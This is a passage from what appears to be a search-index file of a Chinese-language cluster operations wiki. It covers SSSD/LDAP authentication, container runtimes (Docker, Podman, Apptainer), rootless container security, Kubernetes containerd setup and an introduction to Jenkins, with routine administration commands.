LDAP\uff09\uff0c\u5e76\u63d0\u4f9b\u672c\u5730\u7f13\u5b58\uff0c\u4ee5\u63d0\u9ad8\u6027\u80fd\u3002</li> </ul> <p>\u4e8e\u662f\u8fd9\u5957\u7cfb\u7edf\u7684\u6574\u4f53\u67b6\u6784\u5982\u4e0b\u56fe\u6240\u793a\uff1a</p>      SSSD \u67b6\u6784SSSD Architecture - sssd.io <p>\u53c2\u8003\u94fe\u63a5\u4e2d\u7684\u5173\u952e\u8981\u70b9\uff1a</p> <ol> <li>PAM\u3001NSS \u548c SSSD \u5b58\u5728\u4e8e\u672c\u5730 Linux \u64cd\u4f5c\u7cfb\u7edf\u4e2d\u4f5c\u4e3a\u5ba2\u6237\u7aef\u3002</li> <li>\u4efb\u4f55\u5bf9\u64cd\u4f5c\u7cfb\u7edf\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u6216\u6388\u6743\u7684\u8c03\u7528\u6700\u7ec8\u90fd\u4f1a\u8c03\u7528 PAM/NSS\uff0c\u6700\u7ec8\u5230\u8fbe SSSD\uff0c\u5e76\u6700\u7ec8\u5230\u8fbe LDAP\u3002</li> <li>SSSD \u53ef\u4ee5\u4e0e LDAP\u3001KDC \u96c6\u6210\u3002</li> <li>\u8fd9\u4e09\u5c42\u5bf9\u64cd\u4f5c\u7cfb\u7edf\u5e94\u7528\u7a0b\u5e8f\u5b8c\u5168\u900f\u660e\u3002</li> <li>SSSD  \u5728\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u672c\u5730\u7ef4\u62a4\u4e00\u4e2a\u7f13\u5b58\u3002</li> <li>SSSD \u4f1a\u540c\u65f6\u5728\u5916\u90e8\u6e90\u548c\u672c\u5730\u67e5\u627e\u7528\u6237 -&gt; \u5bc6\u7801\u3001\u7528\u6237\u540d -&gt; uid\u3001uid -&gt; \u7528\u6237\u540d\u3001\u7ec4\u540d -&gt; gid \u548c gid -&gt; \u7ec4\u540d\u7b49\u6620\u5c04\u4fe1\u606f\u3002</li> <li><code>getent passwd</code> \u548c <code>getent groups</code> \u547d\u4ee4\u4f1a\u663e\u793a\u5176\u83b7\u53d6\u4fe1\u606f\u7684\u6765\u6e90\u3002</li> </ol>","tags":["help"]},{"location":"operation/system/service/auth/#sssd","title":"SSSD","text":"","tags":["help"]},{"location":"operation/system/service/auth/#sssd-\u7b80\u4ecb","title":"SSSD \u7b80\u4ecb","text":"<p>Quote</p> <ul> <li>SSSD Architecture - sssd.io</li> </ul> <p>SSSD \u5206\u4e3a\u540e\u7aef\uff08Backend\uff09\u548c\u524d\u7aef\uff08Responder\uff09\u4e24\u90e8\u5206\u3002</p> <ul> <li>\u540e\u7aef\u8d1f\u8d23\u4e0e\u8eab\u4efd\u6e90\uff08\u6bd4\u5982 LDAP\uff09\u901a\u4fe1\u3002<ul> <li>\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u6bcf\u4e2a <code>[domain/$name]</code> \u90fd\u5bf9\u5e94\u4e00\u4e2a\u540e\u7aef\uff0c\u8fd0\u884c\u5728\u5355\u72ec\u7684 <code>sssd_be</code> \u8fdb\u7a0b\u4e2d\u3002</li> </ul> </li> <li>\u524d\u7aef\u8d1f\u8d23\u5904\u7406\u6765\u81ea NSS \u548c PAM \u7b49\u7684\u8bf7\u6c42\u3002<ul> <li>\u6bcf\u4e2a\u524d\u7aef\u8fd0\u884c\u5728\u5355\u72ec\u7684\u8fdb\u7a0b\u4e2d\uff0c\u5982 <code>sssd_nss</code>\u3001<code>sssd_pam</code> \u7b49\u3002</li> </ul> </li> </ul> <p>\u6b64\u5916\u8fd8\u6709\uff1a</p> <ul> <li>\u5ba2\u6237\u7aef\u5e93\uff08Client Libraries\uff09\uff0c\u5982 <code>libsss_sudo</code> \u7528\u4e8e\u4e0e <code>sudo</code> \u96c6\u6210\u3002</li> <li>\u76d1\u89c6\u5668\uff08Monitor\uff09\uff0c\u8fd0\u884c\u4e3a\u8fdb\u7a0b <code>sssd</code>\uff0c\u8d1f\u8d23\u76d1\u63a7\u524d\u540e\u7aef\u3002</li> <li>\u5de5\u5177\uff08Tools\uff09\uff0c\u5982 <code>sssctl</code> \u7528\u4e8e\u7ba1\u7406 SSSD\uff0c<code>sss_cache</code> \u7528\u4e8e\u6e05\u7406\u7f13\u5b58\u3002</li> </ul>","tags":["help"]},{"location":"operation/system/service/auth/#sssd-\u914d\u7f6e\u4e0e\u7ef4\u62a4","title":"SSSD \u914d\u7f6e\u4e0e\u7ef4\u62a4","text":"<p>Quote</p> <ul> <li>How to set up SSSD with LDAP - Ubuntu</li> </ul> <p>\u5728 Debian \u4e0a\uff0c\u9700\u8981\u5b89\u88c5\u4e0b\u5217\u8f6f\u4ef6\u5305\uff1a</p> <ul> <li><code>sssd</code>\uff1a\u5143\u5305\uff0c\u4f9d\u8d56\u4e8e <code>sssd-common</code>\u3001<code>sssd-ldap</code>\uff0c\u5e76\u8fdb\u4e00\u6b65\u4f9d\u8d56\u4e8e <code>libnss-sss</code>\u3001<code>libpam-sss</code>\uff0c\u4ece\u800c\u63d0\u4f9b\u5b8c\u6574\u7684\u524d\u540e\u7aef\u652f\u6301\u3002</li> <li><code>sssd-tools</code>\uff1a\u5305\u542b <code>sssctl</code> \u548c <code>sss_cache</code> \u7b49\u5de5\u5177\u3002</li> <li><code>libsss-sudo</code>\uff1a\u63d0\u4f9b\u4e0e <code>sudo</code> \u96c6\u6210\u7684\u5ba2\u6237\u7aef\u5e93\u3002</li> </ul> <p>SSSD \u914d\u7f6e\u6587\u4ef6\u4f4d\u4e8e <code>/etc/sssd/sssd.conf</code>\uff0c\u53ef\u67e5\u9605 <code>man</code> \u624b\u518c\u4e86\u89e3\u8be6\u7ec6\u914d\u7f6e\u3002\u793a\u4f8b\u5982\u4e0b\uff1a</p> <pre><code>[sssd]\ndomains = LDAP\nservices = nss, pam, sudo\nconfig_file_version = 2\n\n[nss]\nfilter_groups = root\nfilter_users = root\n\n[pam]\n\n[domain/LDAP]\n\nid_provider = ldap\nldap_uri = ldaps://...\n</code></pre> <p>\u76ee\u524d\u811a\u672c\u5728 star-home/deploy-ldap\u3002</p>","tags":["help"]},{"location":"operation/system/service/auth/#nss","title":"NSS","text":"<p>Quote</p> <ul> <li>nsswitch.conf(5) - Linux manual page</li> </ul>","tags":["help"]},{"location":"operation/system/service/containers/","title":"\u5bb9\u5668","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/containers/#\u5bb9\u5668","title":"\u5bb9\u5668","text":"<p>Todo</p> <ul> <li> \u5bb9\u5668\u5b9e\u8df5\u9700\u8981\u66f4\u52a0\u7ec6\u81f4\u7684\u6307\u5bfc\u3002</li> <li> Podman \u975e\u7279\u6743\u6302\u8f7d\u6587\u4ef6\u7cfb\u7edf\u95ee\u9898\u3002</li> </ul> <p>\u603b\u7684\u6765\u8bf4\uff0c\u5bb9\u5668\u65b9\u6848\u7684\u9009\u62e9\u5982\u4e0b\uff1a</p> \u65b9\u6848 \u63cf\u8ff0 Docker \u4e3b\u6d41 Podman Docker \u7684 rootless \u66ff\u4ee3\u54c1 Singularity Docker \u5728 HPC \u4e2d\u7684\u66ff\u4ee3\u54c1\uff0c\u4e00\u822c\u8ba4\u4e3a Singularity \u8fd0\u884c MPI \u7b49 HPC \u5e94\u7528\u6027\u80fd\u6bd4 Docker/Podman \u597d Apptainer Singularity \u7684\u540e\u7ee7\u8005\uff0c\u5c31\u76ee\u524d\u4f7f\u7528\u6765\u8bf4\u548c Singularity \u51e0\u4e4e\u6ca1\u5565\u4e0d\u540c <p>Docker \u548c Podman \u90fd\u9075\u5b88 OCI\uff08Open Container Image\uff09\u683c\u5f0f\uff0c\u800c Singularity \u548c Apptainer \u80fd\u591f\u5c06 OCI \u683c\u5f0f\u8f6c\u6362\u4e3a\u81ea\u5df1\u7684 SIF \u683c\u5f0f\u3002</p> <p>TLDR; develop locally with docker; run docker images on HPC systems using podman/singularity; if performance is a concern, use singularity.</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/containers/#\u5bb9\u5668\u6280\u672f\u6982\u8ff0","title":"\u5bb9\u5668\u6280\u672f\u6982\u8ff0","text":"<p>Info</p> <ul> <li> The Containerization Tech Stack</li> </ul>      \u5bb9\u5668\u6280\u672f\u6808      The Containerization Tech Stack <ul> <li>\u8fd0\u884c\u65f6\uff1a\u501f\u52a9 cgroup \u548c namespace \u7b49\u5185\u6838\u6280\u672f\u5b9e\u73b0\u5bb9\u5668\u3002</li> <li>OCI\uff1a\u5b9a\u4e49\u4e86\u5bb9\u5668\u8fd0\u884c\u65f6\u548c\u955c\u50cf\u7684\u6807\u51c6\u3002</li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/containers/#docker","title":"Docker","text":"<p>Quote</p> <ul> <li>Docker Docs</li> </ul> <p>Docker \u5b98\u65b9\u6587\u6863\u6781\u5176\u8be6\u5c3d\u4e14\u5168\u9762\uff0c\u6b64\u5904\u4e0d\u518d\u8d58\u8ff0\u3002\u68c0\u67e5\u4f60\u81ea\u5df1\u662f\u5426\u5177\u5907\u4ee5\u4e0b\u77e5\u8bc6\uff08\u4e0d\u9700\u8981\u4f60\u8bb0\u5fc6\uff0c\u53ea\u9700\u8981\u77e5\u9053\u6709\u8fd9\u4e2a\u4e1c\u897f\u5e76\u4f1a\u67e5\u5b98\u65b9\u6587\u6863\u5373\u53ef\uff09\u5e76\u6709\u8fc7\u76f8\u5173\u7ecf\u9a8c\u3002\u5982\u679c\u6ca1\u6709\uff0c\u8bf7\u5bfb\u627e\u76f8\u5173\u8d44\u6599\u5b66\u4e60\u5e76\u5b9e\u8df5\u3002</p> <ul> <li>\u4ec0\u4e48\u662f\u955c\u50cf\u548c\u5bb9\u5668\uff1f</li> <li>Docker \u6784\u5efa<ul> <li>\u4f1a\u5199 <code>Dockerfile</code></li> </ul> </li> <li>Docker \u8fd0\u884c<ul> <li>\u4f1a\u4f7f\u7528 <code>docker run</code> \u547d\u4ee4\u8fd0\u884c\u5bb9\u5668\u3001\u4f7f\u7528 <code>docker exec</code> \u547d\u4ee4\u8fdb\u5165\u5bb9\u5668</li> <li>\u4f1a\u4f7f\u7528 <code>docker ps</code>\u3001<code>docker logs</code>\u3001<code>docker inspect</code> \u7b49\u547d\u4ee4\u67e5\u770b\u5bb9\u5668\u72b6\u6001</li> </ul> </li> <li>Docker Compose<ul> <li>\u4f1a\u4f7f\u7528 <code>docker compose</code> \u547d\u4ee4</li> <li>\u4f1a\u5199 <code>compose.yml</code> \u6587\u4ef6</li> </ul> </li> </ul> <p>\u4f5c\u4e3a\u8fd0\u7ef4\uff0c\u4f60\u8fd8\u9700\u8981\u4e86\u89e3\uff1a</p> <ul> <li>Docker \u7f51\u7edc</li> <li>Docker \u5b58\u50a8</li> </ul> <p>\u4e00\u4e9b\u5e38\u89c1\u95ee\u9898\u8bb0\u5f55\u5982\u4e0b\uff1a</p> <p>Docker Compose \u8fd0\u884c\u81ea\u5b9a\u4e49\u547d\u4ee4</p> <ul> <li>Docker-Compose Entrypoint/Command - Stack Overflow</li> </ul> <p>Docker \u5bb9\u5668\u53ea\u4f1a\u6267\u884c\u4e00\u6761\u547d\u4ee4\uff0c\u8be5\u547d\u4ee4\u9000\u51fa\u540e\u5bb9\u5668\u4e5f\u4f1a\u9000\u51fa\u3002\u6267\u884c\u7684\u547d\u4ee4\u7531\u5982\u4e0b\u65b9\u5f0f\u51b3\u5b9a\uff1a</p> <ul> <li>\u5982\u679c\u5bb9\u5668\u672a\u5b9a\u4e49 entrypoint\uff0c\u90a3\u4e48\u6267\u884c command\u3002</li> <li>\u5982\u679c\u5bb9\u5668\u5b9a\u4e49\u4e86 entrypoint\uff0c\u90a3\u4e48\u6267\u884c entrypoint\uff0c\u5c06 command \u4f5c\u4e3a entrypoint \u7684\u53c2\u6570\u3002</li> </ul> <p>\u4e3a\u5bb9\u5668\u63d0\u4f9b entrypoint \u548c command \u7684\u65b9\u5f0f\u5982\u4e0b\uff1a</p> \u8fd0\u884c\u65b9\u5f0f \u5b9a\u4e49 entrypoint \u5b9a\u4e49 command <code>docker run</code> <code>--entrypoint &lt;entrypoint&gt;</code> \u9009\u9879 \u955c\u50cf\u540d\u540e\u7684\u53c2\u6570 Dockerfile <code>ENTRYPOINT</code> \u6307\u4ee4 <code>CMD</code> \u6307\u4ee4 Compose \u6587\u4ef6 <code>entrypoint:</code> <code>command:</code> <p>Example</p> <p>\u4f7f\u7528\u4e0b\u9762\u7684 Dockerfile \u6784\u5efa\u5bb9\u5668\uff1a</p> <pre><code>ENTRYPOINT [\"echo\"]\n</code></pre> <p>\u4f7f\u7528\u4e0b\u9762\u7684 compose.yml \u6587\u4ef6\u8fd0\u884c\u5bb9\u5668\uff1a</p> <pre><code>services:\n  test:\n    build: .\n</code></pre> <p>\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u8fd0\u884c\u5bb9\u5668\uff0ccommand \u5c06\u88ab\u4f5c\u4e3a\u53c2\u6570\uff1a</p> <pre><code>$ docker compose run test hello world\nhello world\n</code></pre> <p>\u800c\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u53ef\u4ee5\u8fdb\u5165 Shell\uff1a</p> <pre><code>$ docker compose run --entrypoint bash test\n</code></pre>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/containers/#podman","title":"Podman","text":"<p>Docker \u547d\u4ee4\u5927\u90e8\u5206\u517c\u5bb9\u3002\u5e38\u7528\u547d\u4ee4\u52a9\u8bb0\uff1a</p> <pre><code># \u62c9\u53d6\npodman search {name}\npodman pull docker://{name}:{tag}\npodman images\n# \u8fd0\u884c\npodman run --name {container_name} -d -p {host_port}:{container_port} {name}:{tag}\n# \u67e5\u8be2\npodman ps -a\npodman inspect {contanier_name}\npodman top {container_name/id}\npodman logs &lt;container_name/id&gt;\n# \u4fdd\u5b58\nsudo podman container checkpoint &lt;container_id&gt;\nsudo podman container restore &lt;container_id&gt;\n# \u5220\u9664\npodman stop &lt;container_id&gt;\npodman rm &lt;container_id&gt;\n</code></pre> <p>\u4ece Docker \u8fc1\u79fb\u5230 Podman\uff0c\u7279\u522b\u662f\u4f7f\u7528 <code>podman-compose</code> \u65f6\uff0c\u6709\u4e0d\u5c11\u517c\u5bb9\u6027\u95ee\u9898\u3002\u76ee\u524d\u6211\u4eec\u6240\u77e5\u7684\u6709\uff1a</p> <ul> <li>Docker compose \u6587\u4ef6\u4e2d\u4e0d\u9700\u8981\u518d\u6307\u5b9a UID/GID\uff0c\u5426\u5219\u53ef\u80fd\u9020\u6210 Podman \u5185\u7684\u6587\u4ef6\u7cfb\u7edf\u6743\u9650\u95ee\u9898\u3002</li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/containers/#rootless-\u5bb9\u5668","title":"Rootless \u5bb9\u5668","text":"<p>\u96c6\u7fa4\u4e0d\u4f1a\u5bf9\u666e\u901a\u7528\u6237\u5f00\u653e Root \u6743\u9650\uff0c\u4ee5\u7ef4\u6301\u7cfb\u7edf\u5b89\u5168\u548c\u73af\u5883\u7a33\u5b9a\u3002\u672c\u6587\u6863\u63d0\u4f9b\u4e00\u4e9b rootless \u5de5\u5177\u7684\u5efa\u8bae\uff0c\u5b83\u4eec\u7684\u6027\u80fd\u4e00\u822c\u4e0d\u4f1a\u4e0e root \u7248\u672c\u6709\u5dee\u5f02\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/containers/#rootless-\u5bb9\u5668\u539f\u7406","title":"Rootless \u5bb9\u5668\u539f\u7406","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/containers/#\u5185\u6838\u547d\u540d\u7a7a\u95f4","title":"\u5185\u6838\u547d\u540d\u7a7a\u95f4","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/containers/#\u6027\u80fd","title":"\u6027\u80fd","text":"<p>SC19 Poster \u7ed9\u51fa\u4e86 HPCG \u7684\u7ed3\u679c\uff1a</p> <p>NVIDIA \u5b98\u65b9\u7ed9\u51fa\u4e86 Singularity \u5728 GPU \u4e0a\u7684\u8868\u73b0\uff1a</p> <p>Ume\u00e5 University \u7ed9\u51fa\u4e86 Docker \u548c Singularity \u7684\u6bd4\u8f83\uff1a</p> <ul> <li> <p>Linpack</p> <p></p> </li> <li> <p>\u987a\u5e8f\u8bfb\u5199</p> <p></p> </li> <li> <p>\u968f\u673a\u8bfb\u5199</p> <p></p> </li> <li> <p>\u5185\u5b58</p> <p></p> </li> <li> <p>\u7f51\u7edc</p> <p></p> </li> </ul> <p>\u96c6\u7fa4 A100 40G \u4e0a\u6d4b\u8bd5\u7684\u7ed3\u679c\uff082023.02)\uff1a</p> <ul> <li>bare-metal 1.118e+04 Gflops</li> <li>docker 1.218e+04 Gflops</li> <li>singularity 1.223e+04 Gflops</li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/containers/#\u5b89\u5168","title":"\u5b89\u5168","text":"<p>Rootless \u5bb9\u5668\u88ab\u5e7f\u6cdb\u8ba4\u4e3a\u662f\u5b89\u5168\u7684\uff0c\u56e0\u4e3a\u5b83\u4eec\u4e0d\u9700\u8981 root \u6743\u9650\uff0c\u4ece\u800c\u907f\u514d\u4e86\u9003\u9038\u63d0\u6743\u7684\u95ee\u9898\u3002</p> <p>\u5728 Arch Wiki \u4e0a\u6709\u4e00\u4e2a\u8fc7\u65f6\u7684\u5b89\u5168\u63d0\u793a\uff0c\u76f8\u5173\u7684\u8ba8\u8bba\u59cb\u4e8e 2013 \u5e74\uff1a</p> <p>Rootless Podman relies on the unprivileged user namespace usage (<code>CONFIG_USER_NS_UNPRIVILEGED</code>) which has some serious security implications. Unprivileged user namespace usage (<code>CONFIG_USER_NS_UNPRIVILEGED</code>) is enabled by default in linux, linux-lts and linux-zen, which greatly increases the attack surface for local privilege escalation (see AppArmor's Wiki and FS#36969).</p> <p>\u5982\u4eca\uff0c\u5404\u4e2a\u53d1\u884c\u7248\u90fd\u6709\u76f8\u5e94\u5b89\u5168\u63aa\u65bd\uff0c\u53ef\u4ee5\u8ba4\u4e3a rootless \u5bb9\u5668\u662f\u5b89\u5168\u7684\u3002\u6bd4\u5982\uff0cDebian \u81ea 11 \u5f00\u59cb\u9ed8\u8ba4\u542f\u7528 AppArmor\u3002AppArmor \u901a\u8fc7\u9ed8\u8ba4\u914d\u7f6e\u6587\u4ef6\u9650\u5236\u975e\u7279\u6743\u8fdb\u7a0b\u521b\u5efa\u7684\u7528\u6237\u547d\u540d\u7a7a\u95f4\u5185\u7684\u4efb\u52a1\uff0c\u5e76\u5177\u6709\u8f83\u4f4e\u7684\u6743\u9650\u3002\u5982\u679c\u4e0d\u5b58\u5728\u9ed8\u8ba4\u914d\u7f6e\u6587\u4ef6\uff0cAppArmor \u5c06\u56de\u9000\u5230\u62d2\u7edd\u672a\u53d7\u9650\u7684\u975e\u7279\u6743\u8fdb\u7a0b\u8bbf\u95ee\u7528\u6237\u547d\u540d\u7a7a\u95f4\u3002\u8be6\u89c1  AppArmor / apparmor\u3002</p> <p><code>--privileged</code> \u2014 Podman documentation \u5bf9\u5f53\u524d rootless \u5bb9\u5668\u7684\u5b89\u5168\u6027\u8fdb\u884c\u4e86\u8bf4\u660e\uff1a</p> <p>A privileged container turns off the security features that isolate the container from the host. Dropped Capabilities, limited devices, read-only mount points, Apparmor/SELinux separation, and Seccomp filters are all disabled.</p> <p>Rootless containers cannot have more privileges than the account that launched them.</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/containers/#\u4e13\u4e3a-hpc-\u4f18\u5316\u7684\u5bb9\u5668apptainersingularity","title":"\u4e13\u4e3a HPC \u4f18\u5316\u7684\u5bb9\u5668\uff1aApptainer/Singularity","text":"<p>\u5e38\u7528\u547d\u4ee4\u52a9\u8bb0\uff1a</p> <pre><code>apptainer --debug run docker://alpine\napptainer pull docker://nvcr.io/nvidia/hpc-benchmarks:24.03\n# \u4ea4\u4e92\u5f0f\napptainer shell --nv ./hpc-benchmarks_24.03.sif\n# \u4e0d\u5e26\u4ea4\u4e92\napptainer run --nv ./hpc-benchmarks_24.03.sif /workspace/hpcg.sh --dat /workspace/hpcg-linux-x86_64/sample-dat\napptainer run --nv ./hpc-benchmarks_24.03.sif nsys profile --trace=cuda,openmp,nvtx,cublas --sample=system-wide /workspace/hpcg.sh --dat ~/hpcg/hpcg-nsys.dat\n</code></pre> <ul> <li><code>--nv</code> \u6216 <code>--nvccli</code>\uff1aCUDA \u652f\u6301\u3002\u5e26\u4e0a\u8be5\u9009\u9879\u540e\uff0c\u5728\u5bb9\u5668\u4e2d\u53ef\u4ee5\u4f7f\u7528 <code>nvidia-smi</code>\u00a0\u770b\u5230\u7cfb\u7edf\u4e2d\u7684 GPU \u8bbe\u5907\u3002</li> <li><code>--bind /source:/target</code>\uff1a\u6302\u8f7d\u76ee\u5f55\u3002<ul> <li>Apptainer \u81ea\u52a8\u6302\u8f7d\u8fd9\u4e9b\u76ee\u5f55\uff1a<code>/home/$USER</code>, <code>/tmp</code>, <code>$PWD</code>\u3002</li> </ul> </li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/containers/#k8s","title":"K8S","text":"<p>\u521d\u6b21\u90e8\u7f72 K8S \u65f6\uff0c\u8bf7\u9010\u7bc7\u9605\u8bfb Container Runtimes | Kubernetes\uff0c\u6309\u7167\u6d41\u7a0b\u914d\u7f6e\u3002</p> <p>\u4e0b\u6587\u6309\u7167 kubeadm\u3001kubelet \u7684\u987a\u5e8f\u8fdb\u884c\u914d\u7f6e\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/containers/#\u57fa\u7840\u8bbe\u7f6e","title":"\u57fa\u7840\u8bbe\u7f6e","text":"<p>\u5f00\u542f IP \u8f6c\u53d1\uff0c\u5173\u95ed swap\uff1a</p> <pre><code>cat &lt;&lt;EOF | sudo tee /etc/sysctl.d/k8s.conf\nnet.ipv4.ip_forward = 1\nEOF\nsudo sysctl --system\nsudo swapoff -a\n</code></pre>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/containers/#\u5bb9\u5668\u8fd0\u884c\u65f6containerd","title":"\u5bb9\u5668\u8fd0\u884c\u65f6\uff1acontainerd","text":"<p>Quote</p> <ul> <li>Container Runtimes | Kubernetes</li> <li>containerd/docs/getting-started.md at main \u00b7 containerd/containerd</li> </ul> <p>K8S \u9700\u8981\u4e00\u4e2a\u5bb9\u5668\u8fd0\u884c\u65f6\uff0c\u9ed8\u8ba4\u4f7f\u7528 containerd\u3002\u5982\u679c\u5df2\u5b89\u88c5 Docker\uff0c\u5219 containerd \u5df2\u5b89\u88c5\u3002</p> <pre><code># disabled_plugins = [\"cri\"]\n\n# K8S\n[plugins.\"io.containerd.grpc.v1.cri\"]\n  sandbox_image = \"registry.k8s.io/pause:3.10\"\n[plugins.\"io.containerd.grpc.v1.cri\".containerd.runtimes.runc]\n  [plugins.\"io.containerd.grpc.v1.cri\".containerd.runtimes.runc.options]\n    SystemdCgroup = true\n</code></pre> <ul> <li>containerd \u548c Docker \u7c7b\u4f3c\uff0c\u7531 daemon \u62c9\u53d6\u955c\u50cf\uff0c\u56e0\u6b64\u9700\u8981\u4fee\u6539 systemd unit \u6587\u4ef6\u914d\u7f6e\u4ee3\u7406\u3002</li> </ul> sock rpc error <p>\u6267\u884c <code>kubeadm init</code> \u65f6\uff0c\u5982\u679c\u9047\u5230</p> <pre><code>failed to create new CRI runtime service: validate service connection: validate CRI v1 runtime API for endpoint \"unix:///var/run/containerd/containerd.sock\": rpc error: code = Unimplemented desc = unknown service runtime.v1.RuntimeService[preflight] If you know what you are doing, you can make a check non-fatal with `--ignore-preflight-errors=...`\n</code></pre> <p>\u8fd9\u7c7b\u9519\u8bef\uff0c\u4e00\u822c\u662f containerd \u6ca1\u6709\u914d\u7f6e\u597d\u3002\u6309\u7167 Container Runtimes | Kubernetes \u914d\u7f6e\uff0c\u76f4\u5230 <code>cri</code> \u63d2\u4ef6\u6b63\u5e38\uff1a</p> <pre><code>$ ctr plugin ls | grep cri\nTYPE                   ID   PLATFORM    STATUS\nio.containerd.grpc.v1  cri  linux/amd64 ok\n</code></pre>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/containers/#kubelet","title":"kubelet","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/jenkins/","title":"CI/CD \u5e73\u53f0\uff1aJenkins","text":"","tags":["stable"]},{"location":"operation/system/service/jenkins/#cicd-\u5e73\u53f0jenkins","title":"CI/CD \u5e73\u53f0\uff1aJenkins","text":"","tags":["stable"]},{"location":"operation/system/service/jenkins/#\u57fa\u672c\u6982\u5ff5","title":"\u57fa\u672c\u6982\u5ff5","text":"<p>Quote</p> <ul> <li>What is CI/CD? - GitLab</li> </ul> <ul> <li>\u6301\u7eed\u96c6\u6210\uff08Continuous Integration, CI\uff09\uff1a<ul> <li>\u5c3d\u5feb\u5c06\u4ee3\u7801\u66f4\u6539\u96c6\u6210\u5230\u4e3b\u5e72\u5206\u652f\uff0c\u5728\u63d0\u4ea4\u4e0e\u5408\u5e76\u65f6\u81ea\u52a8\u8fd0\u884c\u6784\u5efa\u548c\u6d4b\u8bd5\u3002</li> <li>\u80fd\u591f\u5728\u5f00\u53d1\u8fc7\u7a0b\u4e2d\u66f4\u5feb\u66f4\u7b80\u5355\u5730\u53d1\u73b0\u548c\u89e3\u51b3\u95ee\u9898\u3002</li> </ul> </li> <li>\u6301\u7eed\u4ea4\u4ed8\uff08Continuous Delivery, CD\uff09\uff1a\u6301\u7eed\u4ea4\u4ed8\u662f\u4e00\u79cd\u8f6f\u4ef6\u5de5\u7a0b\u65b9\u6cd5\uff0c\u65e8\u5728\u6539\u8fdb\u8f6f\u4ef6\u7684\u53d1\u5e03\u6d41\u7a0b\uff0c\u4f7f\u5f97\u8f6f\u4ef6\u7684\u53d1\u5e03\u53ef\u4ee5\u66f4\u52a0\u9891\u7e41\u3001\u66f4\u52a0\u53ef\u9760\u3002<ul> <li>\u4ee3\u7801\u7ecf\u8fc7 CI \u7684\u6d4b\u8bd5\u548c\u6784\u5efa\u540e\uff0cCD \u8d1f\u8d23\u5c06\u4ee3\u7801\u53ca\u5176\u4f9d\u8d56\u6253\u5305\u4e3a\u53ef\u968f\u65f6\u90e8\u7f72\u7684\u8f6f\u4ef6\u5305\uff0c\u5e76\u53ef\u80fd\u5728\u751f\u4ea7\u73af\u5883\u4e2d\u6d4b\u8bd5\u548c\u90e8\u7f72\u3002</li> </ul> </li> </ul> <p>CI/CD \u5f3a\u8c03\u81ea\u52a8\u5316\uff0c\u4f7f\u7528\u6d41\u6c34\u7ebf\uff0c\u5927\u5e45\u8282\u7701\u4eba\u529b\u8d44\u6e90\uff0c\u6781\u5927\u63d0\u9ad8\u6548\u7387\u3002</p> <p>Jenkins \u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u81ea\u52a8\u5316\u670d\u52a1\u5668\uff0c\u7528\u4e8e\u81ea\u52a8\u5316\u5404\u79cd\u4efb\u52a1\uff0c\u5305\u62ec\u6784\u5efa\u3001\u6d4b\u8bd5\u548c\u90e8\u7f72\u8f6f\u4ef6\u3002Jenkins \u652f\u6301\u5404\u79cd\u63d2\u4ef6\uff0c\u53ef\u4ee5\u6269\u5c55\u5176\u529f\u80fd\u3002</p> <p>Debian \u7684\u8d28\u91cf\u7ba1\u7406\uff08Quality Assurance, QA\uff09\u56e2\u961f\u4f7f\u7528 Jenkins \u5728 <code>jenkins.debian.net</code> \u4e0a\u8fdb\u884c\u6301\u7eed\u96c6\u6210\uff0c\u76f8\u5173\u914d\u7f6e\u6587\u4ef6\u89c1  qa/jenkins.debian.net\u3002</p> <p>\u76ee\u524d\u6211\u4eec\u6b63\u5728\u79ef\u6781\u63a8\u8fdb\u4f7f\u7528 CI/CD \u5e73\u53f0\u6784\u5efa\u65e0\u76d8\u7cfb\u7edf\uff0c\u8fd9\u5c06\u4f7f\u5f97\u7cfb\u7edf\u7ba1\u7406\u66f4\u52a0\u6e05\u6670\u3001\u7a33\u5b9a\u3002</p>","tags":["stable"]},{"location":"operation/system/service/jenkins/#jenkins-\u5165\u95e8","title":"Jenkins \u5165\u95e8","text":"<p>Jenkins \u5b98\u65b9\u7684\u5165\u95e8\u6559\u7a0b\u4e0d\u9002\u5408\u6211\u4eec</p> <p>Jenkins \u7684\u5165\u95e8\u6559\u7a0b Creating your first Pipeline - Jenkins \u4e8b\u5b9e\u4e0a\u5f88\u4e0d\u53cb\u597d\uff0c\u4e00\u5f00\u59cb\u5c31\u4f7f\u7528\u590d\u6742\u7684 Multibranch Pipeline \u4efb\u52a1\u3002\u591a\u5206\u652f\u6784\u5efa\u79bb\u6211\u4eec\u592a\u9065\u8fdc\uff0c\u800c\u4e14 Branch Source \u63d2\u4ef6\u5f88\u96be\u914d\u3002\u6211\u4eec\u5e94\u5f53\u4ece\u6700\u7b80\u5355\u6700\u539f\u59cb\u7684 Freestyle \u4efb\u52a1\u5f00\u59cb\u3002</p>","tags":["stable"]},{"location":"operation/system/service/jenkins/#docker-\u5b89\u88c5","title":"Docker \u5b89\u88c5","text":"<p>\u4f7f\u7528\u4e0b\u9762\u7684 Docker compose \u6587\u4ef6\u542f\u52a8 Jenkins\u3002\u8be5 compose \u6587\u4ef6\u8df3\u8fc7\u4e86 Jenkins \u7684\u521d\u59cb\u5316\u5411\u5bfc\uff0c\u76f4\u63a5\u542f\u52a8 Jenkins \u670d\u52a1\u3002</p> compose.yml<pre><code>services:\n  